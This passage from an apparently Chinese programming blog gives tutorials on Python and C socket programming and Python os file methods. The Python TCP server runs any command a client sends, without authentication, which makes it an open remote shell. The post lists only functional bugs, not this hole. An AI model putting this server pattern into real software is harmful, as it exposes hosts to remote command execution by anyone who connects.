<td>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)()</td>
</tr>
<tr>
<td>创建UDP Socket：</td>
<td>s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</td>
</tr>
</tbody>
</table>
<h3 id="2、Socket-函数"><a href="#2、Socket-函数" class="headerlink" title="2、Socket 函数"></a>2、Socket 函数</h3><p>注意点:</p>
<p>1）TCP发送数据时，已建立好TCP连接，所以不需要指定地址。UDP是面向无连接的，每次发送要指定是发给谁。</p>
<p>2）服务端与客户端不能直接发送列表，元组，字典。需要字符串化repr(data)。</p>
<table>
<thead>
<tr>
<th><strong>socket函数</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>服务端socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.bind(address)</td>
<td>将套接字绑定到地址, 在AF_INET下,以元组（host,port）的形式表示地址.</td>
</tr>
<tr>
<td>s.listen(backlog)</td>
<td>开始监听TCP传入连接。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td>
</tr>
<tr>
<td>s.accept()</td>
<td>接受TCP连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。</td>
</tr>
<tr>
<td><strong>客户端socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.connect(address)</td>
<td>连接到address处的套接字。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td>
</tr>
<tr>
<td>s.connect_ex(adddress)</td>
<td>功能与connect(address)相同，但是成功返回0，失败返回errno的值。</td>
</tr>
<tr>
<td><strong>公共socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.recv(bufsize[,flag])</td>
<td>接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td>
</tr>
<tr>
<td>s.send(string[,flag])</td>
<td>发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td>
</tr>
<tr>
<td>s.sendall(string[,flag])</td>
<td>完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td>
</tr>
<tr>
<td>s.recvfrom(bufsize[.flag])</td>
<td>接受UDP套接字的数据。与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td>
</tr>
<tr>
<td>s.sendto(string[,flag],address)</td>
<td>发送UDP数据。将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td>
</tr>
<tr>
<td>s.close()</td>
<td>关闭套接字。</td>
</tr>
<tr>
<td>s.getpeername()</td>
<td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td>
</tr>
<tr>
<td>s.getsockname()</td>
<td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td>
</tr>
<tr>
<td>s.setsockopt(level,optname,value)</td>
<td>设置给定套接字选项的值。</td>
</tr>
<tr>
<td>s.getsockopt(level,optname[.buflen])</td>
<td>返回套接字选项的值。</td>
</tr>
<tr>
<td>s.settimeout(timeout)</td>
<td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td>
</tr>
<tr>
<td>s.gettimeout()</td>
<td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td>
</tr>
<tr>
<td>s.fileno()</td>
<td>返回套接字的文件描述符。</td>
</tr>
<tr>
<td>s.setblocking(flag)</td>
<td>如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td>
</tr>
<tr>
<td>s.makefile()</td>
<td>创建一个与该套接字相关连的文件</td>
</tr>
</tbody>
</table>
<h3 id="3、socket编程思路"><a href="#3、socket编程思路" class="headerlink" title="3、socket编程思路"></a>3、socket编程思路</h3><p>TCP服务端：</p>
<p>1 创建套接字，绑定套接字到本地IP与端口</p>
<p> socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()</p>
<p>2 开始监听连接                   #s.listen()</p>
<p>3 进入循环，不断接受客户端的连接请求              #s.accept()</p>
<p>4 然后接收传来的数据，并发送给对方数据         #s.recv() , s.sendall()</p>
<p>5 传输完毕后，关闭套接字                     #s.close()</p>
<p>TCP客户端:</p>
<p>1 创建套接字，连接远端地址</p>
<p>​       # socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()</p>
<p>2 连接后发送数据和接收数据          # s.sendall(), s.recv()</p>
<p>3 传输完毕后，关闭套接字          #s.close()</p>
<h3 id="4、Socket编程之服务端代码："><a href="#4、Socket编程之服务端代码：" class="headerlink" title="4、Socket编程之服务端代码："></a>4、Socket编程之服务端代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@yangrong:/python<span class="comment"># cat day5-socket-server.py</span></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> socket   <span class="comment">#socket模块</span></div><div class="line"><span class="keyword">import</span> commands   <span class="comment">#执行系统命令模块</span></div><div class="line">HOST=<span class="string">'10.0.0.245'</span></div><div class="line">PORT=<span class="number">50007</span></div><div class="line">s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)   <span class="comment">#定义socket类型，网络通信，TCP</span></div><div class="line">s.bind((HOST,PORT))   <span class="comment">#套接字绑定的IP与端口</span></div><div class="line">s.listen(<span class="number">1</span>)         <span class="comment">#开始TCP监听</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">       conn,addr=s.accept()   <span class="comment">#接受TCP连接，并返回新的套接字与IP地址</span></div><div class="line">       <span class="keyword">print</span><span class="string">'Connected by'</span>,addr    <span class="comment">#输出客户端的IP地址</span></div><div class="line">       <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">                data=conn.recv(<span class="number">1024</span>)    <span class="comment">#把接收的数据实例化</span></div><div class="line">               cmd_status,cmd_result=commands.getstatusoutput(data)   <span class="comment">#commands.getstatusoutput执行系统命令（即shell命令），返回两个结果，第一个是状态，成功则为0，第二个是执行成功或失败的输出信息</span></div><div class="line">                <span class="keyword">if</span> len(cmd_result.strip()) ==<span class="number">0</span>:   <span class="comment">#如果输出结果长度为0，则告诉客户端完成。此用法针对于创建文件或目录，创建成功不会有输出信息</span></div><div class="line">                        conn.sendall(<span class="string">'Done.'</span>)</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                       conn.sendall(cmd_result)   <span class="comment">#否则就把结果发给对端（即客户端）</span></div><div class="line">conn.close()     <span class="comment">#关闭连接</span></div></pre></td></tr></table></figure>
<h3 id="5、Socket编程之客户端代码："><a href="#5、Socket编程之客户端代码：" class="headerlink" title="5、Socket编程之客户端代码："></a>5、Socket编程之客户端代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@yangrong:/python<span class="comment"># cat day5-socket-client.py</span></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line">HOST=<span class="string">'10.0.0.245'</span></div><div class="line">PORT=<span class="number">50007</span></div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      <span class="comment">#定义socket类型，网络通信，TCP</span></div><div class="line">s.connect((HOST,PORT))       <span class="comment">#要连接的IP与端口</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">       cmd=raw_input(<span class="string">"Please input cmd:"</span>)       <span class="comment">#与人交互，输入命令</span></div><div class="line">       s.sendall(cmd)      <span class="comment">#把命令发送给对端</span></div><div class="line">       data=s.recv(<span class="number">1024</span>)     <span class="comment">#把接收的数据定义为变量</span></div><div class="line">        <span class="keyword">print</span> data         <span class="comment">#输出变量</span></div><div class="line">s.close()   <span class="comment">#关闭连接</span></div></pre></td></tr></table></figure>
<h3 id="6、程序缺限："><a href="#6、程序缺限：" class="headerlink" title="6、程序缺限："></a>6、程序缺限：</h3><p>这是一个简单的socket通信，里面存在一些bug</p>
<p>1.在客户端输入回车，会挂死。</p>
<p>2.服务端返回的数据大于1024，客户端显示不全。</p>
<p>3.单进程，如果多个客户端连接，要排队，前一个断开，后一个客户端才能通信。</p>
<p>不想把代码写的太复杂，简单的说下解决方案：</p>
<p>问题1.在客户端上判断输入为空，要求重新输入。</p>
<p>问题2.在客户端上循环接收，直到接收完。但有没有完客户端是不知道的，需要服务端发一个结束符。</p>
<p>问题3.在服务端导入SocketServer模块，使得每建立一个连接，就新创建一个线程。实现多个客户端与服务端通信。多线程通信原理如下图：</p>
<p><a href="http://img1.51cto.com/attachment/201312/000109234.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201312/000109234.jpg" alt="000109234.jpg"></a></p>
<h3 id="python-socket参考地址："><a href="#python-socket参考地址：" class="headerlink" title="python socket参考地址："></a>python socket参考地址：</h3><p><a href="http://blog.163.com/yi_yixinyiyi/blog/static/136286889201152814341144/" target="_blank" rel="external">http://blog.163.com/yi_yixinyiyi/blog/static/136286889201152814341144/</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_4b5039210100ep72.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4b5039210100ep72.html</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_523491650100hikg.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_523491650100hikg.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/c-socket编程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/c-socket编程/" itemprop="url">socket编程</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T22:25:45+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Linux下的socket编程"><a href="#Linux下的socket编程" class="headerlink" title="Linux下的socket编程"></a>Linux下的socket编程</h3><h4 id="server-c"><a href="#server-c" class="headerlink" title="server.c"></a>server.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INET_ADDR_STR 16 </span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_fun</span><span class="params">(<span class="keyword">char</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>( ; *p != <span class="string">'\0'</span> ; p++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>((*p &gt;= <span class="string">'a'</span>) &amp;&amp; (*p &lt;= <span class="string">'z'</span>))</div><div class="line">        &#123;</div><div class="line">            *p = *p - <span class="number">32</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器通信地址结构</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cin</span>;</span>     <span class="comment">//保存客户端通信地址结构</span></div><div class="line">    <span class="keyword">int</span> l_fd;</div><div class="line">    <span class="keyword">int</span> c_fd;</div><div class="line">    <span class="keyword">socklen_t</span> len;</div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];     <span class="comment">//存储传送内容的缓冲区</span></div><div class="line">    <span class="keyword">char</span> addr_p[INET_ADDR_STR]; <span class="comment">//存储客户端地址的缓冲区</span></div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4通信域</span></div><div class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = INADDR_ANY;   <span class="comment">//服务器可以接受任意地址</span></div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port); <span class="comment">//端口转换为网络字节序</span></div><div class="line">     </div><div class="line">    l_fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);   <span class="comment">//创建套接子,使用TCP协议</span></div><div class="line">    bind(l_fd,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">     </div><div class="line">    listen(l_fd,<span class="number">10</span>);    <span class="comment">//开始监听连接</span></div><div class="line">     </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"waiting ....\n"</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        c_fd = accept(l_fd,(struct sockaddr *)&amp;<span class="built_in">cin</span>,&amp;len);</div><div class="line">         </div><div class="line">        n = read(c_fd,buf,MAX_LINE);    <span class="comment">//读取客户端发送来的信息</span></div><div class="line">        inet_ntop(AF_INET,&amp;<span class="built_in">cin</span>.sin_addr,addr_p,INET_ADDR_STR);      <span class="comment">//将客户端传来地址转化为字符串</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"client IP is %s,port is %d\n"</span>,addr_p,ntohs(<span class="built_in">cin</span>.sin_port));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"content is : %s\n"</span>, buf);   <span class="comment">//打印客户端发送过来的数据</span></div><div class="line">        my_fun(buf);</div><div class="line">        write(c_fd,buf,n);          <span class="comment">//转换后发给客户端</span></div><div class="line"> </div><div class="line">        close(c_fd);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"buf = %s\n"</span>,buf);</div><div class="line">    <span class="keyword">if</span>((close(l_fd)) == <span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"fail to close\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="client-c"><a href="#client-c" class="headerlink" title="client.c"></a>client.c</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"> </div><div class="line"> </div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LINE 1024</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span>     <span class="comment">//服务器的地址</span></div><div class="line">    <span class="keyword">char</span> buf[MAX_LINE];</div><div class="line">    <span class="keyword">int</span> sfd;</div><div class="line">    <span class="keyword">int</span> port = <span class="number">8000</span>;</div><div class="line">    <span class="keyword">char</span> *str = <span class="string">"test string"</span>;</div><div class="line">    <span class="keyword">char</span> *serverIP = <span class="string">"127.0.0.1"</span>;</div><div class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        str = argv[<span class="number">1</span>];  <span class="comment">//读取用户输入的字符串</span></div><div class="line">    &#125;</div><div class="line">    bzero((<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;   <span class="comment">//使用IPV4地址族</span></div><div class="line">     </div><div class="line">    inet_pton(AF_INET,serverIP,(<span class="keyword">void</span> *)&amp;(<span class="built_in">sin</span>.sin_addr));</div><div class="line">    <span class="built_in">sin</span>.sin_port = htons(port);</div><div class="line">     </div><div class="line">    sfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</div><div class="line">     </div><div class="line">    connect(sfd,(struct sockaddr *)&amp;(<span class="built_in">sin</span>),<span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</div><div class="line"> </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"str = %s\n"</span> , str);</div><div class="line">    write(sfd , str , <span class="built_in">strlen</span>(str) + <span class="number">1</span>);</div><div class="line">    read(sfd , buf , MAX_LINE);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"recive from server: %s\n"</span> , buf);</div><div class="line"> </div><div class="line">    close(sfd);</div><div class="line">     </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/python-OS-文件-目录方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/python-OS-文件-目录方法/" itemprop="url">python OS 文件/目录方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T21:28:26+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>os</strong> 模块提供了非常丰富的方法用来处理文件和目录。</p>
<h4 id="os-pipe"><a href="#os-pipe" class="headerlink" title="os.pipe()"></a><a href="http://www.runoob.com/python/os-pipe.html" target="_blank" rel="external">os.pipe()</a></h4><p>创建一个管道，返回一对文件描述符(r,w)分别为读和写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">stdinr,stdinw = os.pipe()</div><div class="line">stderrr,stderrw = os.pipe()</div><div class="line">os.write(stdinw, <span class="string">"\x00\x0a\x00\xff"</span>)</div><div class="line">os.write(stderrw, <span class="string">"\x00\x0a\x02\xff"</span>)</div><div class="line"></div><div class="line">proc = subprocess.Popen([<span class="string">"./input"</span>] + args, env=dict(os.environ, **env), stdin=stdinr, stderr=stderrr)</div></pre></td></tr></table></figure>
<blockquote>
<p>上述表示从标准输入中读入&quot;\x00\x0a\x00\xff&quot;，从标准错误中读入&quot;\x00\x0a\x02\xff&quot;</p>
</blockquote>
<h4 id="os-popen-command-mode-bufsize"><a href="#os-popen-command-mode-bufsize" class="headerlink" title="[os.popen(command, mode[, bufsize]])"></a>[os.popen(command<a href="http://www.runoob.com/python/os-popen.html" target="_blank" rel="external">, mode[, bufsize]])</a></h4><p>从一个 command 打开一个管道</p>
<ul>
<li><strong>command</strong> -- 使用的命令。</li>
<li><strong>mode</strong> -- 模式权限可以是 &#39;r&#39;(默认) 或 &#39;w&#39;。</li>
<li><strong>bufsize</strong> -- 指明了文件需要的缓冲大小：0意味着无缓冲；1意味着行缓冲；其它正值表示使用参数大小的缓冲（大概值，以字节为单位）。负的bufsize意味着使用系统的默认值，一般来说，对于tty设备，它是行缓冲；对于其它文件，它是全缓冲。如果没有改参数，使用系统的默认值。</li>
</ul>
<p><strong>返回值</strong></p>
<p>​    返回一个文件描述符号为fd的打开的文件对象</p>
<h4 id="os-open-file-flags-mode"><a href="#os-open-file-flags-mode" class="headerlink" title="os.open(file, flags[, mode])"></a><a href="http://www.runoob.com/python/os-open.html" target="_blank" rel="external">os.open(file, flags[, mode])</a></h4><p>打开一个文件，并且设置需要的打开选项，mode参数是可选的</p>
<ul>
<li><strong>file</strong> -- 要打开的文件</li>
<li><strong>flags</strong> -- 该参数可以是以下选项，多个使用 &quot;|&quot; 隔开：<ul>
<li><strong>os.O_RDONLY:</strong> 以只读的方式打开</li>
<li><strong>os.O_WRONLY:</strong> 以只写的方式打开</li>
<li><strong>os.O_RDWR :</strong> 以读写的方式打开</li>
<li><strong>os.O_NONBLOCK:</strong> 打开时不阻塞</li>
<li><strong>os.O_APPEND:</strong> 以追加的方式打开</li>
<li><strong>os.O_CREAT:</strong> 创建并打开一个新文件</li>
<li><strong>os.O_TRUNC:</strong> 打开一个文件并截断它的长度为零（必须有写权限）</li>
<li><strong>os.O_EXCL:</strong> 如果指定的文件存在，返回错误</li>
<li><strong>os.O_SHLOCK:</strong> 自动获取共享锁</li>
<li><strong>os.O_EXLOCK:</strong> 自动获取独立锁</li>
<li><strong>os.O_DIRECT:</strong> 消除或减少缓存效果</li>
<li><strong>os.O_FSYNC :</strong> 同步写入</li>
<li><strong>os.O_NOFOLLOW:</strong> 不追踪软链接</li>
</ul>
</li>
<li><strong>mode</strong> -- 类似 <a href="http://www.runoob.com/python/os-chmod.html" target="_blank" rel="external">chmod()</a>。</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回新打开文件的描述符。</p>
<h4 id="os-read-fd-n"><a href="#os-read-fd-n" class="headerlink" title="os.read(fd, n)"></a><a href="http://www.runoob.com/python/os-read.html" target="_blank" rel="external">os.read(fd, n)</a></h4><p>从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</p>
<h4 id="os-write-fd-str"><a href="#os-write-fd-str" class="headerlink" title="os.write(fd, str)"></a><a href="http://www.runoob.com/python/os-write.html" target="_blank" rel="external">os.write(fd, str)</a></h4><p>写入字符串到文件描述符 fd中. 返回实际写入的字符串长度</p>
<h4 id="os-close-fd"><a href="#os-close-fd" class="headerlink" title="os.close(fd)"></a><a href="http://www.runoob.com/python/os-close.html" target="_blank" rel="external">os.close(fd)</a></h4><p>关闭文件描述符 fd</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/01/python中网络请求方式总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/01/python中网络请求方式总结/" itemprop="url">python中网络请求方式总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
